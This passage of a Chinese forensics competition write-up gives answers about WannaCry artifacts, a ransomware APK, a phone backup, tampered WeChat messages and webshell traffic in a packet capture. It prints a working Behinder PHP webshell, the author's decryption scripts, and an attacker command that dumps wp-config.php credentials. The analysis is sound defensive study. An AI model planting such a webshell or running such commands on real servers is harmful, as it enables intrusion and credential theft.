alt="image-20241007003109359"></p><h5 id="5-分析计算机检材，接上题，对解密后的数据文件进行分析，甄别身份证号码性别值与标识性别不一致的数量是多少？-标准格式：100"><a href="#5-分析计算机检材，接上题，对解密后的数据文件进行分析，甄别身份证号码性别值与标识性别不一致的数量是多少？-标准格式：100" class="headerlink" title="5  分析计算机检材，接上题，对解密后的数据文件进行分析，甄别身份证号码性别值与标识性别不一致的数量是多少？[标准格式：100]"></a>5  分析计算机检材，接上题，对解密后的数据文件进行分析，甄别身份证号码性别值与标识性别不一致的数量是多少？[标准格式：100]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5001185</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007003316000.png" alt="image-20241007003316000"></p><h5 id="6-分析计算机检材，计算机中存在的“VPN”工具版本是多少？-标准格式：1-1"><a href="#6-分析计算机检材，计算机中存在的“VPN”工具版本是多少？-标准格式：1-1" class="headerlink" title="6  分析计算机检材，计算机中存在的“VPN”工具版本是多少？[标准格式：1.1]"></a>6  分析计算机检材，计算机中存在的“VPN”工具版本是多少？[标准格式：1.1]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.4</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427970.png" alt="image-20240929222718806"></p><h5 id="7-分析计算机检材，计算机中存在的“VPN”节点订阅地址是什么？-标准格式：http-xxx-xx-x-xxx"><a href="#7-分析计算机检材，计算机中存在的“VPN”节点订阅地址是什么？-标准格式：http-xxx-xx-x-xxx" class="headerlink" title="7  分析计算机检材，计算机中存在的“VPN”节点订阅地址是什么？[标准格式：http://xxx.xx/x/xxx]"></a>7  分析计算机检材，计算机中存在的“VPN”节点订阅地址是什么？[标准格式：<a href="http://xxx.xx/x/xxx]">http://xxx.xx/x/xxx]</a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://paste.ee/d/4eIzU</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427971.png" alt="image-20240929222737533"></p><h5 id="8-分析计算机检材，eduwcry压缩包文件的解压密码是什么？-标准格式：abcabc"><a href="#8-分析计算机检材，eduwcry压缩包文件的解压密码是什么？-标准格式：abcabc" class="headerlink" title="8  分析计算机检材，eduwcry压缩包文件的解压密码是什么？[标准格式：abcabc]"></a>8  分析计算机检材，eduwcry压缩包文件的解压密码是什么？[标准格式：abcabc]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yasuomima</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427972.png" alt="image-20240929222835459"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427973.png" alt="image-20240929222901650"></p><h5 id="9-分析计算机检材，接上题，请问恶意程序释放压缩包的md5值是多少。-标准格式：全小写"><a href="#9-分析计算机检材，接上题，请问恶意程序释放压缩包的md5值是多少。-标准格式：全小写" class="headerlink" title="9  分析计算机检材，接上题，请问恶意程序释放压缩包的md5值是多少。[标准格式：全小写]"></a>9  分析计算机检材，接上题，请问恶意程序释放压缩包的md5值是多少。[标准格式：全小写]</h5><p>不做逆向分析了</p><h5 id="10-分析计算机检材，接上题，请问恶意程序记录的洋葱浏览器下载地址是多少？-标准格式：http-xxx-xxx-xxx-xxx-zip"><a href="#10-分析计算机检材，接上题，请问恶意程序记录的洋葱浏览器下载地址是多少？-标准格式：http-xxx-xxx-xxx-xxx-zip" class="headerlink" title="10  分析计算机检材，接上题，请问恶意程序记录的洋葱浏览器下载地址是多少？[标准格式：http://xxx.xxx/xxx/xxx.zip]"></a>10  分析计算机检材，接上题，请问恶意程序记录的洋葱浏览器下载地址是多少？[标准格式：<a href="http://xxx.xxx/xxx/xxx.zip]">http://xxx.xxx/xxx/xxx.zip]</a></h5><p><a href="https://dist.torproject.org/torbrowser/6.5.1/tor-win32-0.2.9.10.zip">https://dist.torproject.org/torbrowser/6.5.1/tor-win32-0.2.9.10.zip</a></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427974.png" alt="image-20240929223125790"></p><h5 id="11-分析计算机检材，接上题，请问恶意程序解密了t-wnry后该dll的md5值是多少。-标准格式：全小写"><a href="#11-分析计算机检材，接上题，请问恶意程序解密了t-wnry后该dll的md5值是多少。-标准格式：全小写" class="headerlink" title="11  分析计算机检材，接上题，请问恶意程序解密了t.wnry后该dll的md5值是多少。[标准格式：全小写]"></a>11  分析计算机检材，接上题，请问恶意程序解密了t.wnry后该dll的md5值是多少。[标准格式：全小写]</h5><h5 id="12-分析计算机检材，接上题，恶意程序运行起来后第一个循环调用了几次taskkill-exe。-标准格式：2"><a href="#12-分析计算机检材，接上题，恶意程序运行起来后第一个循环调用了几次taskkill-exe。-标准格式：2" class="headerlink" title="12  分析计算机检材，接上题，恶意程序运行起来后第一个循环调用了几次taskkill.exe。[标准格式：2]"></a>12  分析计算机检材，接上题，恶意程序运行起来后第一个循环调用了几次taskkill.exe。[标准格式：2]</h5><h5 id="13-分析计算机检材，接上题，请问-WanaDecryptor-exe-lnk文件是通过什么函数创建的。-标准格式：Aabcdef"><a href="#13-分析计算机检材，接上题，请问-WanaDecryptor-exe-lnk文件是通过什么函数创建的。-标准格式：Aabcdef" class="headerlink" title="13  分析计算机检材，接上题，请问@WanaDecryptor@.exe.lnk文件是通过什么函数创建的。[标准格式：Aabcdef]"></a>13  分析计算机检材，接上题，请问@WanaDecryptor@.exe.lnk文件是通过什么函数创建的。[标准格式：Aabcdef]</h5><h5 id="14-分析计算机检材，接上题，恶意程序修改系统桌面壁纸是在哪个函数实现的-标准格式：sub-xxx"><a href="#14-分析计算机检材，接上题，恶意程序修改系统桌面壁纸是在哪个函数实现的-标准格式：sub-xxx" class="headerlink" title="14  分析计算机检材，接上题，恶意程序修改系统桌面壁纸是在哪个函数实现的[标准格式：sub_xxx]"></a>14  分析计算机检材，接上题，恶意程序修改系统桌面壁纸是在哪个函数实现的[标准格式：sub_xxx]</h5><h5 id="15-分析计算机检材，VeraCrypt加密容器的密码是什么？-标准格式：abc"><a href="#15-分析计算机检材，VeraCrypt加密容器的密码是什么？-标准格式：abc" class="headerlink" title="15  分析计算机检材，VeraCrypt加密容器的密码是什么？[标准格式：abc]"></a>15  分析计算机检材，VeraCrypt加密容器的密码是什么？[标准格式：abc]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qwertyuiop1</span><br></pre></td></tr></table></figure><p>谁能想到是个压缩包</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007003616380.png" alt="image-20241007003616380"></p><p>容器密码就在里面</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007003656857.png" alt="image-20241007003656857"></p><h5 id="16-分析计算机检材，其中存在一个苹果手机备份包，手机备份包的密码是什么？-标准格式：12345"><a href="#16-分析计算机检材，其中存在一个苹果手机备份包，手机备份包的密码是什么？-标准格式：12345" class="headerlink" title="16  分析计算机检材，其中存在一个苹果手机备份包，手机备份包的密码是什么？[标准格式：12345]"></a>16  分析计算机检材，其中存在一个苹果手机备份包，手机备份包的密码是什么？[标准格式：12345]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>容器挂载不上的话检查哈希，重新整</p><p>备份包就在容器里</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007005248120.png" alt="image-20241007005248120"></p><p>有密码</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007005206208.png" alt="image-20241007005206208"></p><p>passware爆破？？？，不管了先睡觉</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007005824508.png" alt="image-20241007005824508"></p><p>34分钟哈哈</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007125615720.png" alt="image-20241007125615720"></p><h5 id="17-分析计算机检材，接上题，机主实际篡改多少条微信数据？-标准格式：1"><a href="#17-分析计算机检材，接上题，机主实际篡改多少条微信数据？-标准格式：1" class="headerlink" title="17  分析计算机检材，接上题，机主实际篡改多少条微信数据？[标准格式：1]"></a>17  分析计算机检材，接上题，机主实际篡改多少条微信数据？[标准格式：1]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure><p>有删除的消息碎片，对比一下聊天记录</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007131505044.png" alt="image-20241007131505044"></p><p>金额不对，899改699</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007131708626.png" alt="image-20241007131708626"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007131727012.png" alt="image-20241007131727012"></p><p>急用改不急用</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007131758669.png" alt="image-20241007131758669"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007131807726.png" alt="image-20241007131807726"></p><p>名字改了</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007132005148.png" alt="image-20241007132005148"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007132016155.png" alt="image-20241007132016155"></p><p>？好家伙牛逼，手机是嫌疑人的手机</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007131025874.png" alt="image-20241007131025874"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007131223418.png" alt="image-20241007131223418"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007131306653.png" alt="image-20241007131306653"></p><p>还欠钱，软件是找这个大哥拿的</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007131432327.png" alt="image-20241007131432327"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007131407845.png" alt="image-20241007131407845"></p><h5 id="18-分析计算机检材，接上题，机主共存款了多少金额？-标准格式：10万"><a href="#18-分析计算机检材，接上题，机主共存款了多少金额？-标准格式：10万" class="headerlink" title="18  分析计算机检材，接上题，机主共存款了多少金额？[标准格式：10万]"></a>18  分析计算机检材，接上题，机主共存款了多少金额？[标准格式：10万]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">98万</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007132614215.png" alt="image-20241007132614215"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007132554663.png" alt="image-20241007132554663"></p><h5 id="19-分析计算机检材，在手机模拟器中勒索apk软件的sha256值是什么？-标准格式：全小写"><a href="#19-分析计算机检材，在手机模拟器中勒索apk软件的sha256值是什么？-标准格式：全小写" class="headerlink" title="19  分析计算机检材，在手机模拟器中勒索apk软件的sha256值是什么？[标准格式：全小写]"></a>19  分析计算机检材，在手机模拟器中勒索apk软件的sha256值是什么？[标准格式：全小写]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">340bd211955996c5d62bbde94a0bed4eb3a7965b23af52114991bca02346928e</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427975.png" alt="image-20240929223707154"></p><h5 id="20-分析计算机检材，接上题，请问勒索apk软件的解锁密码是什么？-标准格式：qwer-com"><a href="#20-分析计算机检材，接上题，请问勒索apk软件的解锁密码是什么？-标准格式：qwer-com" class="headerlink" title="20  分析计算机检材，接上题，请问勒索apk软件的解锁密码是什么？[标准格式：qwer.com]"></a>20  分析计算机检材，接上题，请问勒索apk软件的解锁密码是什么？[标准格式：qwer.com]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">anzhuo.com</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427976.png" alt="image-20240929223738862"></p><h4 id="流量分析-1"><a href="#流量分析-1" class="headerlink" title="流量分析"></a>流量分析</h4><h5 id="1-分析流量包检材，给出管理员对web环境进行管理的工具名。（标准格式：小皮）"><a href="#1-分析流量包检材，给出管理员对web环境进行管理的工具名。（标准格式：小皮）" class="headerlink" title="1  分析流量包检材，给出管理员对web环境进行管理的工具名。（标准格式：小皮）"></a>1  分析流量包检材，给出管理员对web环境进行管理的工具名。（标准格式：小皮）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">宝塔</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006190733500.png" alt="image-20241006190733500"></p><h5 id="2-分析流量包检材，给出攻击者的ip地址是多少。（标准格式：127-0-0-1）"><a href="#2-分析流量包检材，给出攻击者的ip地址是多少。（标准格式：127-0-0-1）" class="headerlink" title="2  分析流量包检材，给出攻击者的ip地址是多少。（标准格式：127.0.0.1）"></a>2  分析流量包检材，给出攻击者的ip地址是多少。（标准格式：127.0.0.1）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.209.135</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427977.png" alt="image-20240929224348412"></p><h5 id="3-分析流量包检材，给出攻击者爆破出的网站非管理员用户名是。（标准格式：admin）"><a href="#3-分析流量包检材，给出攻击者爆破出的网站非管理员用户名是。（标准格式：admin）" class="headerlink" title="3  分析流量包检材，给出攻击者爆破出的网站非管理员用户名是。（标准格式：admin）"></a>3  分析流量包检材，给出攻击者爆破出的网站非管理员用户名是。（标准格式：admin）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">saber</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427978.png" alt="image-20240929225234754"></p><h5 id="4-分析流量包检材，攻击者进行目录扫描得到的具有后门的页面url路径为。（标准格式：-abc-html）"><a href="#4-分析流量包检材，攻击者进行目录扫描得到的具有后门的页面url路径为。（标准格式：-abc-html）" class="headerlink" title="4  分析流量包检材，攻击者进行目录扫描得到的具有后门的页面url路径为。（标准格式：&#x2F;abc.html）"></a>4  分析流量包检材，攻击者进行目录扫描得到的具有后门的页面url路径为。（标准格式：&#x2F;abc.html）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/up_load.html</span><br></pre></td></tr></table></figure><p>http.request.uri matches “&#x2F;*.html”.</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427979.png" alt="image-20240929225847065"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427980.png" alt="image-20240929225813382"></p><h5 id="5-分析流量包检材，攻击者通过修改请求包中的哪个字段导致恶意文件成功上传。（标准格式：test-type）"><a href="#5-分析流量包检材，攻击者通过修改请求包中的哪个字段导致恶意文件成功上传。（标准格式：test-type）" class="headerlink" title="5  分析流量包检材，攻击者通过修改请求包中的哪个字段导致恶意文件成功上传。（标准格式：test-type）"></a>5  分析流量包检材，攻击者通过修改请求包中的哪个字段导致恶意文件成功上传。（标准格式：test-type）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type</span><br></pre></td></tr></table></figure><p>http.request.uri matches “&#x2F;up_load.php”</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427981.png" alt="image-20240929230135522"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">$key=&quot;e45e329feb5d925b&quot;;</span><br><span class="line">$_SESSION[&#x27;k&#x27;]=$key;</span><br><span class="line">session_write_close();</span><br><span class="line">$post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">$t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">$post=$t($post.&quot;&quot;);</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">     $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">&#125;</span><br><span class="line">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">    @call_user_func(new C(),$params);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// 密钥，需要与加密时使用的密钥一致</span><br><span class="line">$key = &quot;e45e329feb5d925b&quot;;</span><br><span class="line"></span><br><span class="line">// 这里替换成你的加密数据</span><br><span class="line">$encryptedData = &quot;&quot;; // 你的加密数据</span><br><span class="line"></span><br><span class="line">// 如果没有使用openssl扩展，则需要手动进行base64解码和异或解密</span><br><span class="line">if (!extension_loaded(&#x27;openssl&#x27;)) &#123;</span><br><span class="line">    // 先进行base64解码</span><br><span class="line">    $data = base64_decode($encryptedData);</span><br><span class="line">    </span><br><span class="line">    // 异或解密</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $data[$i] = $data[$i] ^ $key[$i + 1 &amp; 15];</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // 使用openssl解密</span><br><span class="line">    $data = openssl_decrypt($encryptedData, &quot;AES128&quot;, $key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 打印解密后的数据</span><br><span class="line"></span><br><span class="line">//$data = preg_replace(&quot;assert|eval(base64_decode(&#x27;&quot;,&#x27;&#x27;,$data);</span><br><span class="line">$data = preg_replace(&quot;#assert|eval\(base64_decode\(&#x27;#&quot;, &#x27;&#x27;, $data);</span><br><span class="line">//$data = preg_replace(&quot;&#x27;));&quot;, &#x27;&#x27;, $data);</span><br><span class="line">//$data = preg_replace(&#x27;#\&#x27;));#&#x27;, &#x27;&#x27;, $data);</span><br><span class="line">$processedData = preg_replace(&quot;/^\|(.*)&#x27;\)\);$/&quot;, &#x27;$1&#x27;, $data);</span><br><span class="line"></span><br><span class="line">echo base64_decode($processedData);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427982.png" alt="image-20240929230256166"></p><h5 id="6-分析流量包检材，攻击者上传成功的恶意文件-该文件的临时存放路径是。（标准格式：-abc-edf）"><a href="#6-分析流量包检材，攻击者上传成功的恶意文件-该文件的临时存放路径是。（标准格式：-abc-edf）" class="headerlink" title="6  分析流量包检材，攻击者上传成功的恶意文件, 该文件的临时存放路径是。（标准格式：&#x2F;abc&#x2F;edf）"></a>6  分析流量包检材，攻击者上传成功的恶意文件, 该文件的临时存放路径是。（标准格式：&#x2F;abc&#x2F;edf）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/php38mbeJ</span><br></pre></td></tr></table></figure><p>同上图，webshell在&#x2F;uploaded_img&#x2F;cont.php</p><p>这个应该不对</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006141653929.png" alt="image-20241006141653929"></p><p>这个也对的上后面的流量</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006141748108.png" alt="image-20241006141748108"></p><h5 id="冰蝎加密流量解密"><a href="#冰蝎加密流量解密" class="headerlink" title="冰蝎加密流量解密"></a>冰蝎加密流量解密</h5><h6 id="解密方式"><a href="#解密方式" class="headerlink" title="解密方式"></a>解密方式</h6><h6 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h6><p><a href="https://potato.gold/navbar/tool/webshellDecrypt/index.php">Webshell 流量在线解密 V1.0</a></p><h6 id="behinder-pcap-decrypt-php"><a href="#behinder-pcap-decrypt-php" class="headerlink" title="behinder_pcap_decrypt.php"></a>behinder_pcap_decrypt.php</h6><p>写完了才发现还有在线的..</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 密钥，需要与加密时使用的密钥一致</span><br><span class="line">$key = &quot;e45e329feb5d925b&quot;;</span><br><span class="line"></span><br><span class="line">// 检查是否有POST请求</span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123;</span><br><span class="line">    $type = $_POST[&#x27;type&#x27;];</span><br><span class="line"></span><br><span class="line">    if ($type == &#x27;payload&#x27;) &#123;</span><br><span class="line">        $encryptedData = $_POST[&#x27;payloadData&#x27;];</span><br><span class="line">        $decryptedData = openssl_decrypt($encryptedData, &quot;AES128&quot;, $key);</span><br><span class="line"></span><br><span class="line">        if ($decryptedData === false) &#123;</span><br><span class="line">            echo &quot;AES解密失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            $processedData = preg_replace(&quot;#assert|eval\(base64_decode\(&#x27;#&quot;, &#x27;&#x27;, $decryptedData);</span><br><span class="line">            $processedData = base64_decode(preg_replace(&quot;/^\|(.*)&#x27;\)\);$/&quot;, &#x27;$1&#x27;, $processedData));</span><br><span class="line">            // echo $processedData;</span><br><span class="line">            // 使用正则表达式匹配 $cmd 后的值</span><br><span class="line">            if (preg_match(&#x27;/\$cmd=&quot;(.*?)&quot;/&#x27;, $processedData, $matches)) &#123;</span><br><span class="line">                // 如果匹配成功，$matches[1] 将包含匹配的值</span><br><span class="line">                $encodedValue = $matches[1];</span><br><span class="line">                // echo &quot;匹配到的值: &quot; . $encodedValue . &quot;&lt;br&gt;&quot;;</span><br><span class="line">                </span><br><span class="line">                // 对匹配到的值进行Base64解码</span><br><span class="line">                $decodedValue = base64_decode($encodedValue);</span><br><span class="line">                echo &quot;CMD命令: &quot; . $decodedValue . &quot;\n&quot;;</span><br><span class="line">                &#125; </span><br><span class="line">            else &#123;</span><br><span class="line">                echo &quot;没有匹配到值。\n&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        $encryptedData = $_POST[&#x27;responseData&#x27;];</span><br><span class="line">        $decryptedData = openssl_decrypt($encryptedData, &quot;AES128&quot;, $key);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        // 解码JSON字符串</span><br><span class="line">        $dataArray = json_decode($decryptedData, true);</span><br><span class="line"></span><br><span class="line">        // 检查是否包含msg键</span><br><span class="line">        if (isset($dataArray[&#x27;msg&#x27;])) &#123;</span><br><span class="line">            // 提取msg的值</span><br><span class="line">            $msgValue = $dataArray[&#x27;msg&#x27;];</span><br><span class="line"></span><br><span class="line">            // 输出msg的值</span><br><span class="line">            // echo &quot;Msg Value: &quot; . $msgValue . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">            // 如果需要对msg的值进行Base64解码</span><br><span class="line">            $decodedMsgValue = base64_decode($msgValue);</span><br><span class="line">            echo &quot;响应值: &quot; . $decodedMsgValue . &quot;\n&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;No &#x27;msg&#x27; key found in the JSON data.\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Decryption Tool&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Decryption Tool&lt;/h1&gt;</span><br><span class="line">    &lt;?php if (!empty($result)): ?&gt;</span><br><span class="line">        &lt;p&gt;Decrypted Data: &lt;?php echo htmlspecialchars($result); ?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;?php endif; ?&gt;</span><br><span class="line">    &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;payloadData&quot;&gt;Enter Payload Data:&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; id=&quot;payloadData&quot; name=&quot;payloadData&quot; placeholder=&quot;Encrypted Payload Data&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;type&quot; value=&quot;payload&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;label for=&quot;responseData&quot;&gt;Enter Response Data:&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; id=&quot;responseData&quot; name=&quot;responseData&quot; placeholder=&quot;Encrypted Response Data&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;type&quot; value=&quot;response&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h6 id="20294"><a href="#20294" class="headerlink" title="20294"></a>20294</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /www/wwwroot/192.168.209.147 ;cat wp-config.php </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * WordPress 基础配置文件</span><br><span class="line"> *</span><br><span class="line"> * 这个文件被安装程序用于自动生成 wp-config.php 配置文件</span><br><span class="line"> * 您不必使用网站，可以将这个文件复制到「wp-config.php」并填写这些值。</span><br><span class="line"> *</span><br><span class="line"> * 本文件包含以下配置选项：</span><br><span class="line"> *</span><br><span class="line"> * * 数据库设置</span><br><span class="line"> * * 密钥</span><br><span class="line"> * * 数据库表名前缀</span><br><span class="line"> * * ABSPATH</span><br><span class="line"> *</span><br><span class="line"> * @link https://wordpress.org/documentation/article/editing-wp-config-php/</span><br><span class="line"> *</span><br><span class="line"> * @package WordPress</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// ** 数据库设置 - 您可以从您的主机获取这些信息 ** //</span><br><span class="line">/** WordPress 数据库名称 */</span><br><span class="line">define( &#x27;DB_NAME&#x27;, &#x27;192_168_209_147&#x27; );</span><br><span class="line"></span><br><span class="line">/** 数据库用户名 */</span><br><span class="line">define( &#x27;DB_USER&#x27;, &#x27;192_168_209_147&#x27; );</span><br><span class="line"></span><br><span class="line">/** 数据库密码 */</span><br><span class="line">define( &#x27;DB_PASSWORD&#x27;, &#x27;X847Z3QzF1a6MHjR&#x27; );</span><br><span class="line"></span><br><span class="line">/** 数据库主机 */</span><br><span class="line">define( &#x27;DB_HOST&#x27;, &#x27;localhost&#x27; );</span><br><span class="line"></span><br><span class="line">/** 创建表时使用的数据库字符集。 */</span><br><span class="line">define( &#x27;DB_CHARSET&#x27;, &#x27;utf8mb4&#x27; );</span><br><span class="line"></span><br><span class="line">/** 数据库排序规则类型。如不确定，请勿更改。 */</span><br><span class="line">define( &#x27;DB_COLLATE&#x27;, &#x27;&#x27; );</span><br><span class="line"></span><br><span class="line">/**#@+</span><br><span class="line"> * 身份验证唯一密钥与盐。</span><br><span class="line"> *</span><br><span class="line"> * 将这些更改为任意独一无二的字符串！您可以使用</span><br><span class="line"> * &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org 密钥服务&#125;</span><br><span class="line"> * 生成这些。</span><br><span class="line"> *</span><br><span class="line"> * 您可以随时更改这些内容以使所有现有 cookies 失效。</span><br><span class="line"> * 这将强制所有用户必须重新登录。</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define( &#x27;AUTH_KEY&#x27;,         &#x27;@y;Lsw0P+;-ossdjV ^:&#123;6pf#o+JS T&#125;`vZLy!ZwwFD&amp;61^AsfW1z8aauV&#123;&amp;&#125;]~q&#x27; );</span><br><span class="line">define( &#x27;SECURE_AUTH_KEY&#x27;,  &#x27;a&lt;6MJ#M|X&#125;T#&#125;Y_^-dJ;dk=dSs6AI[I*Hf=HD~FK4rSv$Ery8Tif/3P2ws/x9g4B&#x27; );</span><br><span class="line">define( &#x27;LOGGED_IN_KEY&#x27;,    &#x27;ko$X58cfx@d^3`OS|T39#yX;/~v+jDi=!qijpfLv_nk%~gw*-WM&amp;P0w67)T.Xz_f&#x27; );</span><br><span class="line">define( &#x27;NONCE_KEY&#x27;,        &#x27;r:!rT(RGWY^zB=z&#125;,]amQI?mp#/RbIENVu#H.M,&gt;6t8UvVwAb1o#GmXo@d0K[ (1&#x27; );</span><br><span class="line">define( &#x27;AUTH_SALT&#x27;,        &#x27;.uDPH|t!OG  NAr0ts8=`_$?,9.9W&#123;J!=W.94yV=&gt;CdHoOMz]JCGO~-cI2]jQwN0&#x27; );</span><br><span class="line">define( &#x27;SECURE_AUTH_SALT&#x27;, &#x27;&gt;_/,*C2,^K-fW`lGtAabOWicWR1_VAA#jVnl/3|79&#123;Fi^-M&#125;p&lt;mV&gt;KGw=Gj=(%k8&#x27; );</span><br><span class="line">define( 